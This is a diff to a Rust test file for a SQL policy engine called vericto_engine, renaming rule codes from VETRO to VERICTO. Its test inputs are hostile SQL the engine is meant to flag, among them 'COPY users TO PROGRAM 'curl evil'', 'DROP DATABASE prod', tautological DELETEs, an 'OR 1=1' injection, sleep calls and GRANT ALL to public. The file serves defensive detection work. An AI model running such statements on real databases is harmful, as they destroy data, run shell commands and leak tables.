@@ -1,4 +1,4 @@
-use vetro_engine::{
+use vericto_engine::{
     evaluate, Decision, Dialect, EnforcementAction, EnforcementPolicy, Rule, RuleType, Severity,
 };
 
@@ -21,35 +21,35 @@ fn rule(code: &str, sev: Severity) -> Rule {
 fn ruleset() -> Vec<Rule> {
     use Severity::*;
     vec![
-        rule("VETRO-001", Critical),
-        rule("VETRO-003", Critical),
-        rule("VETRO-010", Critical),
-        rule("VETRO-011", Critical),
-        rule("VETRO-012", Critical),
-        rule("VETRO-030", Critical),
-        rule("VETRO-042", Critical),
-        rule("VETRO-090", Critical),
-        rule("VETRO-002", High),
-        rule("VETRO-013", High),
-        rule("VETRO-015", High),
-        rule("VETRO-016", High),
-        rule("VETRO-031", High),
-        rule("VETRO-033", High),
-        rule("VETRO-040", High),
-        rule("VETRO-070", High),
-        rule("VETRO-050", Medium),
-        rule("VETRO-051", Medium),
-        rule("VETRO-061", Medium),
-        rule("VETRO-060", Low),
+        rule("VERICTO-001", Critical),
+        rule("VERICTO-003", Critical),
+        rule("VERICTO-010", Critical),
+        rule("VERICTO-011", Critical),
+        rule("VERICTO-012", Critical),
+        rule("VERICTO-030", Critical),
+        rule("VERICTO-042", Critical),
+        rule("VERICTO-090", Critical),
+        rule("VERICTO-002", High),
+        rule("VERICTO-013", High),
+        rule("VERICTO-015", High),
+        rule("VERICTO-016", High),
+        rule("VERICTO-031", High),
+        rule("VERICTO-033", High),
+        rule("VERICTO-040", High),
+        rule("VERICTO-070", High),
+        rule("VERICTO-050", Medium),
+        rule("VERICTO-051", Medium),
+        rule("VERICTO-061", Medium),
+        rule("VERICTO-060", Low),
         // New rules added by the ENG-007/008 fixes.
-        rule("VETRO-017", High),
-        rule("VETRO-018", High),
-        rule("VETRO-019", High),
-        rule("VETRO-080", Critical),
-        rule("VETRO-081", Critical),
-        rule("VETRO-082", High),
-        rule("VETRO-083", High),
-        rule("VETRO-084", High),
+        rule("VERICTO-017", High),
+        rule("VERICTO-018", High),
+        rule("VERICTO-019", High),
+        rule("VERICTO-080", Critical),
+        rule("VERICTO-081", Critical),
+        rule("VERICTO-082", High),
+        rule("VERICTO-083", High),
+        rule("VERICTO-084", High),
     ]
 }
 
@@ -58,7 +58,7 @@ fn matching_codes(sql: &str, d: Dialect, rules: &[Rule], p: &EnforcementPolicy) 
         .iter()
         .filter(|r| {
             let o = evaluate(sql, d, std::slice::from_ref(r), p);
-            o.rule_code.is_some() && o.rule_code.as_deref() != Some("VETRO-PARSE-ERROR")
+            o.rule_code.is_some() && o.rule_code.as_deref() != Some("VERICTO-PARSE-ERROR")
         })
         .map(|r| r.code.clone())
         .collect()
@@ -170,7 +170,7 @@ fn assert_matches(label: &str, sql: &str, d: Dialect, mut expected: Vec<&str>) {
 
 #[test]
 fn eng_001_limit_bounds_non_pg_select() {
-    // MySQL SELECT with LIMIT must NOT trip VETRO-050 anymore.
+    // MySQL SELECT with LIMIT must NOT trip VERICTO-050 anymore.
     assert_matches(
         "ENG-001 mysql limit",
         "SELECT id FROM t WHERE id = 1 LIMIT 10",
@@ -195,20 +195,20 @@ fn eng_001_limit_bounds_non_pg_select() {
         "ENG-001 no limit still flags",
         "SELECT id FROM t WHERE id = 1",
         Dialect::Mysql,
-        vec!["VETRO-050"],
+        vec!["VERICTO-050"],
     );
 }
 
 #[test]
 fn eng_002_003_pg_insert() {
-    // INSERT … SELECT now flags VETRO-040 on Postgres.
+    // INSERT … SELECT now flags VERICTO-040 on Postgres.
     let m = matching_codes(
         "INSERT INTO archive SELECT * FROM users",
         Dialect::Postgres,
         &ruleset(),
         &EnforcementPolicy::default(),
     );
-    assert!(m.contains(&"VETRO-040".to_string()), "got {m:?}");
+    assert!(m.contains(&"VERICTO-040".to_string()), "got {m:?}");
     // INSERT … VALUES is NOT a SELECT source.
     let m = matching_codes(
         "INSERT INTO t (a) VALUES (1)",
@@ -216,7 +216,7 @@ fn eng_002_003_pg_insert() {
         &ruleset(),
         &EnforcementPolicy::default(),
     );
-    assert!(!m.contains(&"VETRO-040".to_string()), "got {m:?}");
+    assert!(!m.contains(&"VERICTO-040".to_string()), "got {m:?}");
 }
 
 #[test]
@@ -225,7 +225,7 @@ fn eng_004_drop_database_pg() {
         "ENG-004 drop database",
         "DROP DATABASE prod",
         Dialect::Postgres,
-        vec!["VETRO-010"],
+        vec!["VERICTO-010"],
     );
 }
 
@@ -236,15 +236,15 @@ fn eng_005_nested_select_attrs_pg() {
         "ENG-005 nested tautology",
         "SELECT id FROM (SELECT * FROM users WHERE id=1 OR 1=1) x LIMIT 5",
         Dialect::Postgres,
-        vec!["VETRO-090"],
+        vec!["VERICTO-090"],
     );
-    // Inner SELECT * (no WHERE) is caught by VETRO-051 even though the outer
-    // query is bounded; VETRO-050 must NOT fire (outer query has a LIMIT).
+    // Inner SELECT * (no WHERE) is caught by VERICTO-051 even though the outer
+    // query is bounded; VERICTO-050 must NOT fire (outer query has a LIMIT).
     assert_matches(
         "ENG-005 nested star",
         "SELECT id FROM (SELECT * FROM users) x LIMIT 5",
         Dialect::Postgres,
-        vec!["VETRO-051"],
+        vec!["VERICTO-051"],
     );
 }
 
@@ -256,14 +256,14 @@ fn eng_006_sleep_in_projection() {
         &ruleset(),
         &EnforcementPolicy::default(),
     );
-    assert!(m.contains(&"VETRO-070".to_string()), "pg got {m:?}");
+    assert!(m.contains(&"VERICTO-070".to_string()), "pg got {m:?}");
     let m = matching_codes(
         "SELECT sleep(5)",
         Dialect::Mysql,
         &ruleset(),
         &EnforcementPolicy::default(),
     );
-    assert!(m.contains(&"VETRO-070".to_string()), "mysql got {m:?}");
+    assert!(m.contains(&"VERICTO-070".to_string()), "mysql got {m:?}");
     // Qualified pg_catalog.pg_sleep is still caught.
     let m = matching_codes(
         "SELECT pg_catalog.pg_sleep(5)",
@@ -271,7 +271,10 @@ fn eng_006_sleep_in_projection() {
         &ruleset(),
         &EnforcementPolicy::default(),
     );
-    assert!(m.contains(&"VETRO-070".to_string()), "qualified got {m:?}");
+    assert!(
+        m.contains(&"VERICTO-070".to_string()),
+        "qualified got {m:?}"
+    );
 }
 
 #[test]
@@ -280,25 +283,25 @@ fn eng_007_dangerous_pg_statements() {
         "ENG-007 copy program",
         "COPY users TO PROGRAM 'curl evil'",
         Dialect::Postgres,
-        vec!["VETRO-080"],
+        vec!["VERICTO-080"],
     );
     assert_matches(
         "ENG-007 do block",
         "DO $$ BEGIN DELETE FROM users; END $$",
         Dialect::Postgres,
-        vec!["VETRO-081"],
+        vec!["VERICTO-081"],
     );
     assert_matches(
         "ENG-007 grant",
         "GRANT ALL ON ALL TABLES IN SCHEMA public TO public",
         Dialect::Postgres,
-        vec!["VETRO-082"],
+        vec!["VERICTO-082"],
     );
     assert_matches(
         "ENG-007 merge",
         "MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN UPDATE SET x=1",
         Dialect::Postgres,
-        vec!["VETRO-083"],
+        vec!["VERICTO-083"],
     );
     let m = matching_codes(
         "CREATE TABLE leak AS SELECT * FROM users",
@@ -306,15 +309,15 @@ fn eng_007_dangerous_pg_statements() {
         &ruleset(),
         &EnforcementPolicy::default(),
     );
-    assert!(m.contains(&"VETRO-084".to_string()), "ctas got {m:?}");
-    // Plain COPY TO STDOUT is not the PROGRAM form → no VETRO-080.
+    assert!(m.contains(&"VERICTO-084".to_string()), "ctas got {m:?}");
+    // Plain COPY TO STDOUT is not the PROGRAM form → no VERICTO-080.
     let m = matching_codes(
         "COPY users TO STDOUT",
         Dialect::Postgres,
         &ruleset(),
         &EnforcementPolicy::default(),
     );
-    assert!(!m.contains(&"VETRO-080".to_string()), "stdout got {m:?}");
+    assert!(!m.contains(&"VERICTO-080".to_string()), "stdout got {m:?}");
 }
 
 #[test]
@@ -323,17 +326,17 @@ fn eng_008_alter_table_subtypes() {
         (
             "drop constraint",
             "ALTER TABLE t DROP CONSTRAINT fk",
-            "VETRO-017",
+            "VERICTO-017",
         ),
         (
             "alter col type",
             "ALTER TABLE t ALTER COLUMN c TYPE text",
-            "VETRO-018",
+            "VERICTO-018",
         ),
         (
             "disable trigger",
             "ALTER TABLE t DISABLE TRIGGER ALL",
-            "VETRO-019",
+            "VERICTO-019",
         ),
     ] {
         let m = matching_codes(
@@ -348,7 +351,7 @@ fn eng_008_alter_table_subtypes() {
 
 #[test]
 fn eng_009_deep_tautology() {
-    // All of these are effectively WHERE-less DELETEs → VETRO-003.
+    // All of these are effectively WHERE-less DELETEs → VERICTO-003.
     for sql in [
         "DELETE FROM users WHERE id = id",
         "DELETE FROM users WHERE 2 > 1",
@@ -360,7 +363,7 @@ fn eng_009_deep_tautology() {
             &ruleset(),
             &EnforcementPolicy::default(),
         );
-        assert!(m.contains(&"VETRO-003".to_string()), "`{sql}` got {m:?}");
+        assert!(m.contains(&"VERICTO-003".to_string()), "`{sql}` got {m:?}");
     }
     // MySQL truthy literal `WHERE 1`.
     let m = matching_codes(
@@ -369,7 +372,7 @@ fn eng_009_deep_tautology() {
         &ruleset(),
         &EnforcementPolicy::default(),
     );
-    assert!(m.contains(&"VETRO-003".to_string()), "where 1 got {m:?}");
+    assert!(m.contains(&"VERICTO-003".to_string()), "where 1 got {m:?}");
     // False-positive guard: a real bounded predicate is NOT always-true.
     let m = matching_codes(
         "DELETE FROM users WHERE id = 5",
@@ -377,7 +380,7 @@ fn eng_009_deep_tautology() {
         &ruleset(),
         &EnforcementPolicy::default(),
     );
-    assert!(!m.contains(&"VETRO-003".to_string()), "id=5 got {m:?}");
+    assert!(!m.contains(&"VERICTO-003".to_string()), "id=5 got {m:?}");
     // `2 < 1` is always FALSE → must NOT be treated as always-true.
     let m = matching_codes(
         "DELETE FROM users WHERE 2 < 1",
@@ -385,24 +388,24 @@ fn eng_009_deep_tautology() {
         &ruleset(),
         &EnforcementPolicy::default(),
     );
-    assert!(!m.contains(&"VETRO-003".to_string()), "2<1 got {m:?}");
+    assert!(!m.contains(&"VERICTO-003".to_string()), "2<1 got {m:?}");
 }
 
 #[test]
 fn eng_010_drop_schema_single_match() {
-    // DROP SCHEMA must match ONLY VETRO-012, not also VETRO-010.
+    // DROP SCHEMA must match ONLY VERICTO-012, not also VERICTO-010.
     assert_matches(
         "ENG-010 drop schema",
         "DROP SCHEMA analytics CASCADE",
         Dialect::Postgres,
-        vec!["VETRO-012"],
+        vec!["VERICTO-012"],
     );
-    // DROP TABLE still matches VETRO-010 (and not VETRO-012).
+    // DROP TABLE still matches VERICTO-010 (and not VERICTO-012).
     assert_matches(
         "ENG-010 drop table",
         "DROP TABLE users",
         Dialect::Postgres,
-        vec!["VETRO-010"],
+        vec!["VERICTO-010"],
     );
 }
 
